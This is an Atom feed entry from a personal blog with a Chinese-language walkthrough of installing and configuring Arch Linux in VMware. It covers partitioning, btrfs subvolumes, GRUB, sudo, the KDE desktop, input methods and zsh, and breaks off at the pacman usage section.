<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2024-11-11T14:35:10.816Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>arch日记</title>
    <link href="https://ixout.github.io/posts/54589/"/>
    <id>https://ixout.github.io/posts/54589/</id>
    <published>2024-11-10T02:24:07.000Z</published>
    <updated>2024-11-11T14:35:10.816Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Arch安装"><a href="#Arch安装" class="headerlink" title="Arch安装"></a>Arch安装</h1><p>关于Arch的安装有很多教程,例如</p><p>官方Wiki<a href="https://wiki.archlinux.org/title/Installation_guide#Pre-installation">Installation guide - ArchWiki</a></p><p>中文教程<a href="https://arch.icekylin.online/guide/rookie/basic-install">archlinux 基础安装 | archlinux 简明指南</a></p><p>跟着这些教程一步步做就能简单地安装好Arch,但仅仅是依葫芦画瓢地敲一遍指令是不够的,还得理解为什么需要这些指令(chatgpt真是我的好伙伴)</p><h2 id="why-efi"><a href="#why-efi" class="headerlink" title="why efi"></a>why efi</h2><p>众多教程的第一步,一般都是修改镜像的引导方式为<code>efi</code>,为什么要这样修改</p><p><strong>现代硬件支持</strong>：大多数现代计算机（自2010年以来发布的主板）默认支持 UEFI，并逐步淘汰旧的 BIOS 模式。EFI 提供了更多功能，如更快的启动速度和更大的分区支持，因此在新硬件上更为兼容。</p><p><strong>分区支持</strong>：EFI 引导使用的是 GPT（GUID Partition Table）分区表，相比传统 BIOS 使用的 MBR（Master Boot Record）分区表，GPT 支持更大的硬盘（超过 2TB）和更多的主分区（最多 128 个）。这是大型硬盘和多系统环境下的必备功能。</p><p><strong>安全引导（Secure Boot）支持</strong>：EFI 支持安全引导（Secure Boot），这是一种安全机制，旨在防止未经授权的操作系统和恶意软件在系统启动时加载。尽管 Arch Linux 默认不启用安全引导，但 UEFI 提供了这种可能性，且对有此需求的用户更加灵活。</p><p><strong>系统引导管理更灵活</strong>：EFI 的引导管理比传统 BIOS 更灵活。EFI 系统分区（ESP）中可以存放多个系统的启动文件，可以通过 EFI Shell 或主板的启动菜单方便地选择和管理不同系统，便于在多系统环境中使用。</p><p><strong>更好的兼容性</strong>：绝大多数 Linux 发行版（包括 Arch Linux）都在 UEFI 环境下进行了更广泛的测试和优化。使用 EFI 可以减少兼容性问题，更符合现代系统的设计需求。</p><p>对于新手或是想要构建一个长期支持的系统来说，EFI 的方式更符合主流硬件的标准。</p><h2 id="禁用reflector服务"><a href="#禁用reflector服务" class="headerlink" title="禁用reflector服务"></a>禁用reflector服务</h2><p>reflector服务是Arch用于自动更新pacman包管理器软件源的服务,但对于国内用户,有时候会造成一些麻烦,所以选择关闭</p><p><code>systemctl stop reflector.service</code></p><p>通过<code>systemctl status reflector.service</code>可以查看该服务状态</p><h2 id="设置系统时钟"><a href="#设置系统时钟" class="headerlink" title="设置系统时钟"></a>设置系统时钟</h2><p>部分程序对于系统时间有要求,如果系统时钟不准确可能会造成某些错误,所以需要与网络时间进行同步</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span> <span class="comment"># 将系统时间与网络时间进行同步</span></span><br><span class="line">timedatectl status <span class="comment"># 检查服务状态</span></span><br></pre></td></tr></table></figure><p>默认时区UTC+0,但不影响</p><h2 id="更改软件源"><a href="#更改软件源" class="headerlink" title="更改软件源"></a>更改软件源</h2><p>这一步配置过ubuntu等环境的应该都不陌生</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure><p>这里选择将其换为清华源(其实可以多放几个备用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</span><br></pre></td></tr></table></figure><p>然后更新软件包缓存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure><h2 id="分区和格式化"><a href="#分区和格式化" class="headerlink" title="分区和格式化"></a>分区和格式化</h2><h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><p>这一步开始就是重头戏了</p><p><strong>lsblk</strong>命令即<code>list block</code>,用于列出所有可用块设备的信息</p><p>由于是使用vmware安装的,所以我们在其中找到与我们分配的空间最接近的块设备,这个即是之后我们需要操作的</p><p><strong>cfdisk</strong>命令用于显示和操作磁盘分区表,可以对任意块设备进行分区操作,通过用户友好的界面提供了基础的分区功能,更高级的操作可以使用<code>fdisk</code>操作</p><p><code>cfdisk /dev/sda</code></p><p><code>sda</code>即是之前获取的块设备,命令输入之后会让我们选择分区表的种类,这里当然选择gpt(GUID Partition Table)</p><p>然后new出三个分区,分别是</p><ul><li>交换分区,交换分区的主要作用就是当系统内存不足时,用于存储内存中不常用的数据,从而释放出物理内存,一般大小和内存差不多即可</li><li>efi引导区,用于存储系统引导加载程序和 EFI 引导文件的分区</li><li>linux文件系统,用于存储用户数据</li></ul><p>分区完成之后,可以通过<code>fdisk -l</code>命令查看分区状态</p><h3 id="格式化并创建btrfs子券"><a href="#格式化并创建btrfs子券" class="headerlink" title="格式化并创建btrfs子券"></a>格式化并创建btrfs子券</h3><p><code>mkfs.fat -F32 /dev/sda1</code></p><p><strong>mkfs.fat</strong>是一个格式化工具，用于将分区创建为 FAT 文件系统。<strong>mkfs</strong> 即”make filesystem” 的缩写,而 <code>fat</code> 表示 FAT 类型的文件系统。<code>-F32</code>表示使用 FAT32 文件系统格式。FAT32 是一种广泛兼容的文件系统，UEFI 标准要求 EFI 系统分区（ESP）使用 FAT32 格式，以便所有支持 UEFI 的设备都能识别并使用该分区</p><p>这条命令就是在 <code>/dev/sda1</code> 上创建一个新的 FAT32 文件系统，删除分区上已有的所有数据。</p><p><code>mkswap /dev/sda2</code></p><p><strong>mkswap</strong>即<code>make swap area</code>用于设置并格式化交换分区</p><p><code>mkfs.btrfs -L arch /dev/sda3</code></p><p>这个和第一个命令一样,但这次是将分区创建为<code>btrfs</code>文件系统,<code>-L arch</code>用于将arch作为该分区的Lable,也可以是其他可见字符</p><h2 id="操作btrfs分区"><a href="#操作btrfs分区" class="headerlink" title="操作btrfs分区"></a>操作btrfs分区</h2><p>到这一步我们已经成功格式化了之前创建的三个分区,并且对其进行了对应的文件系统格式化</p><p>efi引导区和swap交换区已经设置完成,但我们还需要对btrfs分区进行进一步的操作</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mount -t btrfs -o compress=zstd /dev/sda3 /mnt</span><br><span class="line"><span class="comment">#将 /dev/sda3 这个分区以 Btrfs 文件系统挂载到 /mnt 目录，并启用 Zstandard（zstd）压缩选项。以下是详细解释</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"><span class="comment">#查看挂载情况</span></span><br></pre></td></tr></table></figure><p>分区完成后,我们如何访问这个分区呢,那么还得将其挂在到/mnt节点方便访问</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">btrfs subvolume create /mnt/@</span><br><span class="line"><span class="comment">#创建 / 目录子卷</span></span><br><span class="line">btrfs subvolume create /mnt/@home</span><br><span class="line"><span class="comment">#创建 /home 目录子卷</span></span><br><span class="line"><span class="comment">#通过使用这些子卷，可以实现独立管理系统数据和用户数据。比如，可以为根子卷（@）创建快照以备份系统，但不影响用户数据；也可以单独备份或恢复用户数据。</span></span><br><span class="line">btrfs subvolume list -p /mnt</span><br><span class="line"><span class="comment">#复查子卷情况</span></span><br><span class="line">umount /mnt</span><br><span class="line"><span class="comment">#卸载/mnt以便将子券挂载上去</span></span><br></pre></td></tr></table></figure><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mount -t btrfs -o subvol=/@,compress=zstd /dev/sda3 /mnt     </span><br><span class="line"><span class="comment">#将btrfs文件系统分区sda3的/子卷挂载作为根目录,所以需要将之前的取消挂载</span></span><br><span class="line"><span class="built_in">mkdir</span> /mnt/home</span><br><span class="line">mount -t btrfs -o subvol=/@home,compress=zstd /dev/sda3 /mnt/home      </span><br><span class="line"><span class="comment">#挂载home子卷到/mnt/home</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/boot</span><br><span class="line">mount /dev/sda1 /mnt/boot      </span><br><span class="line"><span class="comment">#挂载/boot启动引导区</span></span><br><span class="line">swapon /dev/sda2</span><br><span class="line"><span class="comment">#激活/swap交换分区</span></span><br></pre></td></tr></table></figure><p><strong>mount</strong>命令在学习linux内核的时候有不少接触,这个命令还是很强大的</p><p><strong>swapon</strong>命令用于激活linux地交换空间</p><p>检查</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"><span class="comment">#查看挂载情况</span></span><br><span class="line">free -h</span><br><span class="line"><span class="comment">#查看swap分区挂载情况</span></span><br></pre></td></tr></table></figure><h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><p>挂载完成后,子卷还是空空荡荡的,接下来就是安装系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware btrfs-progs</span><br></pre></td></tr></table></figure><p><strong>pacstrap</strong>是 Arch Linux 的一个安装工具,用于在已挂载的目标分区中安装基本的软件包</p><ul><li><strong><code>base</code></strong>：这个软件包组包含构建 Arch Linux 所需的基本组件，如核心工具、库、shell 等。它是构成 Arch Linux 系统的最小配置，安装后系统可以正常启动并进入命令行。</li><li><strong><code>base-devel</code></strong>：包含开发工具包，如 <code>gcc</code>、<code>make</code>、<code>pkg-config</code> 等，通常用于构建和编译软件包。安装 <code>base-devel</code> 是为了方便系统上进行编译和开发工作，也用于 AUR（Arch User Repository）中软件包的编译安装。</li><li><strong><code>linux</code></strong>：这是 Arch Linux 的 Linux 内核包，包含了 Linux 内核和基本的启动配置，是系统的核心组成部分。</li><li><strong><code>linux-firmware</code></strong>：包含大量硬件的固件，支持各种硬件设备（如 Wi-Fi、显卡、蓝牙等），确保系统能识别和支持大多数硬件。</li><li><strong><code>btrfs-progs</code></strong>：这是 Btrfs 文件系统的工具包，包含管理 Btrfs 文件系统的各种工具（如 <code>mkfs.btrfs</code>、<code>btrfs</code> 命令等）。如果系统根分区或其他分区使用了 Btrfs 文件系统，则需要此包来管理和维护它</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt networkmanager vim sudo zsh zsh-completions</span><br></pre></td></tr></table></figure><p>再安装一些功能性软件</p><h2 id="生成fstab文件"><a href="#生成fstab文件" class="headerlink" title="生成fstab文件"></a>生成fstab文件</h2><p><code>fstab</code> 用来定义磁盘分区。它是 Linux 系统中重要的文件之一</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">genfstab -U /mnt &gt; /mnt/etc/fstab</span><br><span class="line"><span class="comment">#genfstab 自动根据当前挂载情况生成并写入 fstab 文件：</span></span><br><span class="line"><span class="built_in">cat</span> /mnt/etc/fstab</span><br></pre></td></tr></table></figure><h2 id="change-root"><a href="#change-root" class="headerlink" title="change root"></a>change root</h2><p>之前的所有操作其实都是在引导程序中完成的</p><p>现在真正进入新系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure><p>此时，原来安装盘下的 <code>/mnt</code> 目录就变成了新系统的 <code>/</code> 目录</p><h2 id="hostname与时区"><a href="#hostname与时区" class="headerlink" title="hostname与时区"></a>hostname与时区</h2><p>hostname</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname</span><br><span class="line"><span class="comment">#改成自己喜欢的内容</span></span><br></pre></td></tr></table></figure><p>hosts</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   hostname.localdomain hostname</span><br><span class="line"><span class="comment">#hostname用之前自己设置的取代.区分大小写</span></span><br></pre></td></tr></table></figure><p>时区</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure><p>设置硬件时间</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure><p>设置locale</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br><span class="line"><span class="comment">#去除en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8的注释</span></span><br><span class="line">locale-gen</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;LANG=en_US.UTF-8&#x27;</span> \&gt; /etc/locale.conf</span><br></pre></td></tr></table></figure><h2 id="设置root"><a href="#设置root" class="headerlink" title="设置root"></a>设置root</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure><h2 id="安装微码"><a href="#安装微码" class="headerlink" title="安装微码"></a>安装微码</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S intel-ucode <span class="comment"># Intel</span></span><br><span class="line">pacman -S amd-ucode <span class="comment"># AMD</span></span><br></pre></td></tr></table></figure><p>根据芯片自行选择</p><h2 id="安装引导程序"><a href="#安装引导程序" class="headerlink" title="安装引导程序"></a>安装引导程序</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr os-prober</span><br></pre></td></tr></table></figure><ul><li><code>grub</code> —— 启动引导器,用于加载和管理系统启动的完整程序,是linux最常见的引导器</li><li><code>efibootmgr</code> —— <code>efibootmgr</code> 被 <code>grub</code> 脚本用来将启动项写入 NVRAM</li><li><code>os-prober</code> —— 为了能够引导 win10，需要安装 <code>os-prober</code> 以检测到它,虚拟机内其实没啥必要</li></ul><p>安装 GRUB 到 EFI 分区</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=ARCH</span><br></pre></td></tr></table></figure><ul><li><code>--efi-directory=/boot</code> —— 将 <code>grubx64.efi</code> 安装到之前的指定位置（EFI 分区）</li><li><code>--bootloader-id=ARCH</code> —— 取名为 <code>ARCH</code></li></ul><p>进行一些修改</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure><ul><li>去掉 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 一行中最后的 <code>quiet</code> 参数</li><li>把 <code>loglevel</code> 的数值从 <code>3</code> 改成 <code>5</code>。这样是为了后续如果出现系统错误，方便排错</li><li>加入 <code>nowatchdog</code> 参数，这可以显著提高开关机速度</li></ul><p>最后生成配置文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><h2 id="结束安装"><a href="#结束安装" class="headerlink" title="结束安装"></a>结束安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> </span><br><span class="line"><span class="comment"># 退回安装环境</span></span><br><span class="line">umount -R /mnt </span><br><span class="line"><span class="comment"># 卸载新分区</span></span><br><span class="line">reboot </span><br><span class="line"><span class="comment"># 重启,虚拟机直接重启即可</span></span><br></pre></td></tr></table></figure><p>重启后关闭iso镜像的的连接</p><p>开启NetworkManager服务并设置其为开机自启</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now NetworkManager</span><br></pre></td></tr></table></figure><h1 id="常用设置"><a href="#常用设置" class="headerlink" title="常用设置"></a>常用设置</h1><h2 id="设置非root用户"><a href="#设置非root用户" class="headerlink" title="设置非root用户"></a>设置非root用户</h2><p>以root用户身份运行所有命令是很危险的</p><p><strong>新增一个用户</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -G wheel -s /bin/zsh ixout</span><br></pre></td></tr></table></figure><ul><li><code>-m</code> 创建用户的同时创建用户家目录</li><li><code>-G</code>选项后指定附加组<ul><li><code>wheel</code> —— <code>wheel</code> 附加组可 <code>sudo</code> 进行提权</li></ul></li><li><code>-s</code> 选项后指定 shell 程序</li></ul><p><strong>设置密码</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd ixout</span><br></pre></td></tr></table></figure><p><strong>允许sudo</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EDITOR=vim visudo</span><br></pre></td></tr></table></figure><p>取消<code>#%wheel ALL=(ALL:ALL) ALL</code>的注释</p><ul><li><code>%wheel</code> —— 用户名或用户组，此处则代表是 <code>wheel</code> 组，<code>%</code> 是用户组的前缀</li><li><code>ALL=</code> —— 主机名，此处则代表在所有主机上都生效（如果把同样的 <code>sudoers</code> 文件下发到了多个主机上）</li><li><code>(ALL:ALL)</code> —— (任意用户:任意用户组)，此处则代表可以成为任意目标用户/用户组</li><li>最后的 <code>ALL</code> —— 代表可以执行任意命令</li></ul><blockquote><p> 几个更详细的例子:</p><ol><li>在 <code>mailadmin</code> 组里的用户可以作为 <code>root</code> 用户，在 <code>snow</code> 和 <code>rain</code> 这两台主机执行一些邮件服务器控制命令（命令之间用 <code>,</code> 分隔）：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%mailadmin  snow,rain=(root)  /usr/sbin/postfix, /usr/sbin/postsuper, /usr/bin/doveadm</span><br></pre></td></tr></table></figure><ol><li>用户 <code>whoami</code> 可以在所有主机上以 <code>root</code> 用户不输入密码执行 <code>rndc reload</code> 这条命令（正常来说 <code>sudo</code> 都是要求输入调用方的密码的）：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami  ALL=(root)  NOPASSWD: /usr/sbin/rndc reload</span><br></pre></td></tr></table></figure><ol><li>当在 <code>users</code> 组里的用户以 <code>sudo passwd</code> 或者 <code>sudo passwd root</code> 方式运行命令的时候，可以直接把 <code>root</code> 用户的密&gt; 码 改掉，这真是太危险了！必须要把这两条命令禁止掉，但我们又希望用户可以通过 <code>sudo passwd</code> 修改其它用户的密码。那么我们可以在命令前面加上 <code>!</code> 来表示不可执行的命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%users  ALL=(root)  !/usr/bin/passwd, /usr/bin/passwd [A-Za-z]*, !/usr/bin/passwd root</span><br></pre></td></tr></table></figure><ol><li>总结一下，语法如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名/%用户组名 主机名=(目标用户名) 命令1, 命令2, !命令3</span><br></pre></td></tr></table></figure></blockquote><h2 id="开启32支持"><a href="#开启32支持" class="headerlink" title="开启32支持"></a>开启32支持</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br></pre></td></tr></table></figure><p>去掉 <code>[multilib]</code> 一节中两行的注释，来开启 32 位库支持</p><h2 id="设置中文社区仓库"><a href="#设置中文社区仓库" class="headerlink" title="设置中文社区仓库"></a>设置中文社区仓库</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br></pre></td></tr></table></figure><p>最底下增加两行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.cloud.tencent.com/archlinuxcn/$arch # 清华大学开源软件镜像站</span><br></pre></td></tr></table></figure><p>退出并刷新</p><h2 id="安装桌面环境"><a href="#安装桌面环境" class="headerlink" title="安装桌面环境"></a>安装桌面环境</h2><p>以往使用ubuntu都是用的gnome,这次尝试一下kde</p><p><strong>kde</strong>即<code>K Desktop Environment</code>是一个国际化的自由软件项目，提供桌面环境、应用程序和平台,其下有一个著名的桌面就是plasma也就是我们要安装的</p><p>安装以下包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-meta konsole dolphin </span><br><span class="line"><span class="comment"># plasma-meta 元软件包、konsole 终端模拟器和 dolphin 文件管理器</span></span><br></pre></td></tr></table></figure><p>会有一些包选择,这个默认回车就行了</p><p>安装完毕后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sddm</span><br><span class="line"><span class="comment">#开启sddm服务开机自启动</span></span><br><span class="line">systemctl start sddm  </span><br><span class="line"><span class="comment">#直接启动显示管理器</span></span><br></pre></td></tr></table></figure><p>之后输入密码进入桌面</p><h2 id="基础功能包"><a href="#基础功能包" class="headerlink" title="基础功能包"></a>基础功能包</h2><p>安装一些基础功能包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sof-firmware alsa-firmware alsa-ucm-conf<span class="comment"># 声音固件</span></span><br><span class="line">sudo pacman -S ntfs-3g <span class="comment"># 使系统可以识别 NTFS 格式的硬盘</span></span><br><span class="line">sudo pacman -S adobe-source-han-serif-cn-fonts wqy-zenhei <span class="comment"># 安装几个开源中文字体。一般装上文泉驿就能解决大多 wine 应用中文方块的问题</span></span><br><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-extra <span class="comment"># 安装谷歌开源字体及表情</span></span><br><span class="line">sudo pacman -S ark <span class="comment"># 压缩软件。在 dolphin 中可用右键解压压缩包</span></span><br><span class="line">sudo pacman -S gwenview <span class="comment"># 图片查看器</span></span><br><span class="line">sudo pacman -S packagekit-qt6 packagekit appstream-qt appstream <span class="comment"># 确保 Discover（软件中心）可用，需重启</span></span><br></pre></td></tr></table></figure><p>archlinuxcn资源</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S archlinuxcn-keyring <span class="comment"># cn 源中的签名（archlinuxcn-keyring 在 archlinuxcn）</span></span><br><span class="line">sudo pacman -S yay <span class="comment"># yay 命令可以让用户安装 AUR 中的软件（yay 在 archlinuxcn）</span></span><br></pre></td></tr></table></figure><h2 id="vmtools"><a href="#vmtools" class="headerlink" title="vmtools"></a>vmtools</h2><p>vmware下安装操作系统怎么能少的了vmtools</p><p>由于官方的vmtools更新维护不足,我们使用open-vm-tools替代</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S xf86-video-vmware xf86-input-vmware</span><br><span class="line">sudo pacman -S gtkmm gtk2</span><br><span class="line">sudo pacman -S gtkmm3</span><br><span class="line"><span class="comment">#这几个都是相关的依赖不能缺少</span></span><br><span class="line">sudo pacman -S open-vm-tools</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> --now vmtoolsd.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> --now vmware-vmblock-fuse.service</span><br></pre></td></tr></table></figure><p>这样搞完以后基本上就完成了,为什么说基本上</p><p>因为此时如果你使用的是Wayland窗口系统,那么会发现主机向虚拟机复制没问题,但无法从虚拟机往主机复制</p><p>倒腾了许久,最后还是在wiki上翻到<a href="https://wiki.archlinuxcn.org/wiki/VMware/安装_Arch_Linux_为虚拟机#拖拽与复制粘贴">VMware/安装 Arch Linux 为虚拟机 - Arch Linux 中文维基</a></p><p>发现切换到x11就能够解决,应该是wayland和vmtools的适配不是很好</p><p>另外这么一切换发现整个图形界面的流畅度明显提高,之前总是感觉有一丝的延迟,用着怪难受的</p><p>还有就是鼠标完全被限制在虚拟机内部不能自由移出,这个也在切换x11后解决,用起来舒服多了,不用总是按ctrl+alt</p><h2 id="中文输入法"><a href="#中文输入法" class="headerlink" title="中文输入法"></a>中文输入法</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im <span class="comment"># 输入法基础包组</span></span><br><span class="line">sudo pacman -S fcitx5-chinese-addons <span class="comment"># 官方中文输入引擎</span></span><br></pre></td></tr></table></figure><p>之后修改<code>vim ~/.config/environment.d/im.conf</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fix fcitx problem</span></span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>由于fcitx5自带词库稍有些简陋所以可以额外安装一些备用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-rime</span><br></pre></td></tr></table></figure><h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S zsh zsh-autosuggestions zsh-syntax-highlighting zsh-completions</span><br><span class="line">sudo pacman -S autojump</span><br></pre></td></tr></table></figure><p>修改用户默认shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br><span class="line">sudo chsh -s /usr/bin/zsh root<span class="comment">#修改root</span></span><br></pre></td></tr></table></figure><p>之后重启系统</p><p>打开终端会有一个zsh初始化设置</p><p>按下 <code>0</code> 将创建一个只包含注释的 <code>~/.zshrc</code> 文件，在下次启动时不会再次弹出设置选项</p><p>为了使插件生效,需要设置~/.zshrc</p><h1 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h1><h2 id="pacman"><a href="#pacman" class="headerlink" title="pacman"></a>pacman</h2><p>Arch使用pacman作为包管理器</p><p><strong>安装</strong></p><p><code>pacman -S pkg1 pkg2 ...</code></p><p> 在安装之前会先与软件库进行同步。</p><p><strong>卸载</strong></p><p><code>pacman -R 